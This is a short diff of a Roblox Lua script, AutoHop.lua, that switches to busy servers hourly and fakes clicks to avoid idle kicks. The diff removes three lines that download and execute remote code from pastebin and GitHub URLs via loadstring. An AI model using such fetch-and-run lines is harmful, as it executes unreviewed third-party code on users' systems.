@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/EbWYzsks"))()
-
 --[[
   AutoHop.lua
   - Hops to a busy (max players, but not full) public server every hour
@@ -246,6 +244,3 @@ player.Idled:Connect(function()
     vu:CaptureController()
     vu:ClickButton2(Vector2.new())
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Umniv/NEW-UMNIVERSAL-SCRIPT-/refs/heads/main/serverlist"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
